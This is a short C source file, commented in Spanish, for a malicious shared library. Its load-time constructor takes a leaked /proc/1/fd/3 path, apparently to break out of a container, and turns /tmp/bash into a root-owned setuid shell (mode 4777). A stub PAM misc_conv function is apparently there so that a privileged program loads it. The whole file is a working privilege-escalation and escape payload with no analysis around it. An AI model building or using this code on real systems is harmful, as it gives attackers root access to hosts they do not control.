#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

static __attribute__ ((constructor)) void init(void);

int misc_conv(int num_msg, const struct pam_message **msgm, struct pam_response **response, void *appdata_ptr) {
    return 1;
}

void init(void) {
    const char *fn = "/proc/1/fd/3/../../../../../../../../tmp/bash";
    const char *mode = "4777";
    int mode_int = strtol(mode, NULL, 8);

    // Cambia el propietario del archivo a root
    if (chown(fn, 0, 0) == -1) {
        perror("Error changing owner");
    }

    // Cambia los permisos del archivo
    if (chmod(fn, mode_int) == -1) {
        perror("Error changing mode");
    }
}